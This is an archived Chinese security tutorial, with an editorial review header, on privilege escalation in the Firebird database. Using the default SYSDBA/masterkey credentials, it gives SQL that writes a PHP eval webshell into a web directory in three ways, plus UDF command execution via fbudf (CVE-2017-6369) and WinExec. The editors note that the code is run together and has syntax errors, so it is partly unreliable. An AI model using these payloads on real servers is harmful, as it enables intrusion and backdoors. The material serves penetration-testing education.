---
source: "MrWQ/vulnerability-paper"
cve: "CVE-2017-6369"
identifier_role: "primary"
primary_identifiers: "CVE-2017-6369"
referenced_identifiers: ""
identifier_status: "unknown"
title: "Firebird数据库提权姿势总结   技术精选0128"
product: "Firebird数据库"
record_type: "vulnerability"
document_type: "多方法数据库安全教学"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "Windows Server2019+Firebird3.0.7为环境；多方法需数据库凭据/文件写入权限/Web可执行目录；Linux UDF限2.5.x<2.5.7和3.0.x<3.0.2"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Firebird/Firebird%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20%20%20%E6%8A%80%E6%9C%AF%E7%B2%BE%E9%80%890128.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/Jgj-It1ONQApWPLVt6ZdCg"
id: "vw-c5b394db3991318272d5e14f"
entity_id: "ve-c5b394db3991318272d5e14f"
schema_version: "1"
---

# Firebird数据库提权姿势总结   技术精选0128

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Firebird数据库
- 文献类型：多方法数据库安全教学
- 版本、权限及部署边界：Windows Server2019+Firebird3.0.7为环境；多方法需数据库凭据/文件写入权限/Web可执行目录；Linux UDF限2.5.x<2.5.7和3.0.x<3.0.2
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 实际数据库教程误入系统安全；应分开默认口令/有权写数据库文件/非默认外部表/UDF历史漏洞，不等同一个无认证CVE
2. SQL关键词与代码行粘连，内部反引号嵌套，SQL示例的FIRST与LIMIT混用待语法核验，不能直接当可用PoC
3. 称最新版本有效实际测试版本3.0.7，应锁定测试时间/版本；写webshell需Web根目录及脚本解释器存在
4. 明确默认配置阻止外部表及新版本限制Windows UDF值得保留，修复链接追溯至官方文档/CORE-5474
5. 原公众号URL可追溯；截图缺失/留白与广告清理

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/Jgj-It1ONQApWPLVt6ZdCg>
- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
- 原文参考链接（未重新核验）：<http://firebirdsql.org/en/firebird-3-0-7/>
- 原文参考链接（未重新核验）：<https://github.com/mariuz/flamerobin/releases>
- 原文参考链接（未重新核验）：<https://www.firebirdsql.org/file/documentation/html/en/firebirddocs/qsg3/firebird-3-quickstartguide.html>
- 原文参考链接（未重新核验）：<https://www.firebirdsql.org/file/documentation/html/en/refdocs/fblangref25/firebird-25-language-reference.html#fblangref25-ddl-tbl-external>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Jgj-It1ONQApWPLVt6ZdCg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/WTOrX1w0s56SCcicutqYiarKB82TYibkfpj8icy0Bm6eo7bwVWibicT0bdCOBB3ichDQCgsHGx6baib5wqsz6hEh24WQlA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s56SCcicutqYiarKB82TYibkfpjSagSTADBichxZLfAwVG9sBfAbuy69DsxzuTVc7Yuxes0c5hnicTVTJLQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

本文约3500字，阅读约需9分钟。

  

在一次端口探测中，发现了3050端口，第一时间没想到是什么服务在运行，查了查，居然是冷门的Firebird。

  

翻看了网上的资料，几乎没有。在国外看到一个汇总贴，但里面存在几处报错情况，作者却以某些情况下可能会执行成功，一笔带过了，而报错原因就在官方文档写着，属于某些较新版本的安全调整。

  

Firebird实在是冷门，在某友人鼓励下，遂有此文。

  

**1**

  

**Firebird数据库简介**

  

Firebird是一个跨平台的关系数据库系统，目前能够运行在Windows、linux和各种Unix操作系统上，提供了大部分SQL-99标准的功能。它既能作为多用户环境下的数据库服务器运行，也提供嵌入式数据库的实现。

  

Firebird脱胎于Borland公司的开源版数据库Interbase6.0，是一个完全非商业化的产品，用C和C++开发。由于与interbase的血缘关系，大部分interbase的开发工具可以直接应用到Firebird开发中。Firebird使用MozillaPublic License v.1.1许可证发行。

  

一个Firebird数据库服务器能够管理多个独立的数据库，每一个数据库同时可支持多个客户端连接。

  

**准备环境和工具：**
------------

  

安装Firebird，我选择在Windows Server 2019安装了Firebird服务端。

  

**安装包地址：**

  

"http://firebirdsql.org/en/firebird-3-0-7/"

  

靶机IP：10.211.55.5 ，部署好以后重启，会默认开放3050端口。  

  

在Kali安装Firebird客户端，首先执行：

  

```
sudo apt-get -y install firebird3.0-utils
```

  

也可以试试跨平台的图形化工具flamerobin。

  

地址：

  

"https://github.com/mariuz/flamerobin/releases"

  

安装过程中，默认以SuperServer模式运行，如果一直按Next，注意看英文小字，不输入用户名和密码，默认用户名就是SYSDBA，默认密码masterkey。

  

安装好之后重启，对外开放默认端口3050。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s565S7a27YGv36L4GU6gXIb98vUjnq0qeiazrsaqOxGnUFyMABlgjPor25OCqhucrSvqGjLMRFnPfyw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s565S7a27YGv36L4GU6gXIb9HuibUxHqGtM7efLssIK4MibbWV4sCicVbibUNtiakOibP8td4iajRUtlkmJHA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

  

创建或者第一次连接数据库的同时，必须使用该用户名以及密码来实现访问，否则会报错。具体命令如下：

  

```
SQL>createdatabase '[新建数据库的路径以及名称，后缀名称为.FDB]'user 'sysdba' password 'masterkey';
```

  

需要说明的是，一条命令一定是以“;”结束的。否则会在下一行显示“CON>”,即继续之前的命令。

  

快速入门——官方文档参考：

  

"https://www.firebirdsql.org/file/documentation/html/en/firebirddocs/qsg3/firebird-3-quickstartguide.html"

  

**2**

  

**3种姿势**

  

介绍一下Firebird写webshell的3种姿势。  

  

### **常规的SQL语句写webshell**

  

这一种方法通用性最好，可以在足够权限的路径下，创建任意后缀的文件。但缺点就是生成的webshell体积大，创建简单的一句话木马，大小就超过1Mb，有许多数据库写入的脏字符。

  

如果你的webshell代码特别多，选用下文的第三种方法。执行完几行SQL语句，最后要EXIT才会成功写入文件。

  

```
`CREATEDATABASE '10.211.55.5/3050:C:\webroot\shell.php' user 'SYSDBA'password 'masterkey';``CREATETABLE a ( x BLOB);``INSERTINTO a VALUES ('<?php eval(@$_POST["pass"]);?>');``COMMIT;``EXIT;`
```

  





### 

  

### **外部表写webshell**

  

先创建一个不存在的数据库文件，然后创建外部表。外部表就是我们的webshell，再对其写入内容，但是由于firebird.conf的默认安全配置，写入被阻止了。

  



  

```
`CREATEDATABASE '10.211.55.5/3050:C:\non-existent-file' user 'SYSDBA'password 'masterkey';``CREATETABLE a EXTERNAL 'C:\wwwroot\mytest.asp' ( x char(2000));``INSERTINTO a values ('<%= date() %>');`
```

  

不推荐实战使用，非默认配置才能成功，需要管理员修改配置文件firebird.conf，参考官方文档说明：

  

"https://www.firebirdsql.org/file/documentation/html/en/refdocs/fblangref25/firebird-25-language-reference.html#fblangref25-ddl-tbl-external"

  

### **增量写shell**

  

先创建一个不存在的数据库文件，再创建额外的增量文件，执行备份，写入webshell内容，这种方法在最新的Firebird测试下有效，虽然还有脏字符，但是生成的webshell文件只有64KB，能正常执行，推荐采用这种方式提权。

  

```
`CREATEDATABASE '10.211.55.5/3050:C:\temp\non-existent-file' user 'SYSDBA'password 'masterkey';``CREATETABLE a( x blob);``ALTERDATABASE ADD DIFFERENCE FILE 'C:\webroot\shellC.php';``ALTERDATABASE BEGIN BACKUP;``INSERTINTO a VALUES ('<?php eval(@$_POST["pass"]);?>');``COMMIT;``EXIT;`
```

  



  

**3**

  

**UDF提权**

### 

  

### Linux的UDF提权CVE-2017-6369这个漏洞，影响范围Firebird2.5.x< 2.5.7 和3.0.x <3.0.2，该漏洞是由于默认安全配置是”UdfAccess= Restrict UDF“，允许任意权限的数据库用户通过调用fbudf.so执行代码。攻击代码如下：

  

```
`SQL>DECLARE EXTERNAL FUNCTION exec cstring(4096) RETURNS integer BY VALUEENTRY_POINT 'system' MODULE_NAME 'fbudf';``SQL>SELECT FIRST 1 exec('<COMMAND>') FROM any_table LIMIT 1;`
```

  

### **windows的UDF提权**

  

对应的windows的UDF提权攻击代码如下，在新版本中被限制了：

  

```
`CREATEDATABASE '10.211.55.5/3050:C:\temp\non-existent-file1' user 'SYSDBA'password 'masterkey';``DECLAREEXTERNAL FUNCTION EXEC cstring(4096), integer RETURNS integer BYVALUE ENTRY_POINT 'WinExec' MODULE_NAME'c:\windows\system32\kernel32.dll';``SELECTFIRST 1 EXEC('<COMMAND>', 1) FROM any_table LIMIT 1;`
```

  



  

参考文档：

  

"https://firebirdsql.org/rlsnotesh/config-fb-conf.html"

  

亲测了一下，可以调用Firebird安装目录UDF文件夹的dll文件，比如：

  

```
C:\ProgramFiles\Firebird\Firebird30\UDF\fbudf.dll
```

  

Firebird的安全防范手段和高版本的MYSQL一样，要完成UDF提权，就要配合其他漏洞了。

  

**4**

  

**总结**

  

本文主要介绍了Firebird数据库提权，包括3种SQL语句写webshell的姿势，以及不同平台下的UDF提权。其他的RCE漏洞可以参考metasploit攻击模块，但是都挺有年代感了。

  

以下是参考资料：

  

"https://www.firebirdsql.org/file/documentation/html/en/firebirddocs/qsg3/firebird-3-quickstartguide.html"

  

"https://www.infosecmatter.com/firebird-database-exploitation/"

  

"https://www.firebirdsql.org/file/documentation/html/en/refdocs/fblangref25/firebird-25-language-reference.html#fblangref25-ddl-tbl-external"

  

"http://tracker.firebirdsql.org/browse/CORE-5474"

  

  

- END -

  

  

往期推荐

  

[](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247494294&idx=1&sn=acc7c2cbd9a617580f6ab8d849397ae1&chksm=9b3acc27ac4d45312a548beed9afbdc3dd0f715c2eb99093048f3e1e9a44474af57f76058e23&scene=21#wechat_redirect)

记一次卑微的渗透测试

[](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247493672&idx=1&sn=a232d6cb3a87a10dbe2fffe67265aa0b&chksm=9b3ace99ac4d478f63aa57e2d0268f93a07b63e5c471ef2186fa58ac192a0fbe2a96ee426973&scene=21#wechat_redirect)

pwn入门之栈入门

[](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247493839&idx=1&sn=6e580a2e6194c80903adb1cacde39ae9&chksm=9b3ace7eac4d4768a5cf83bc22c0dbb618ad674e85f1a4ef18f9069f119117e2529aef77aac5&scene=21#wechat_redirect)

MYSQL另类利用方式

长按下方图片即可**关注**



  

**点击下方阅读原文，加入社群，读者作者无障碍交流**

**读完有话想说？点击留言按钮，让上万读者听到你的声音！**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
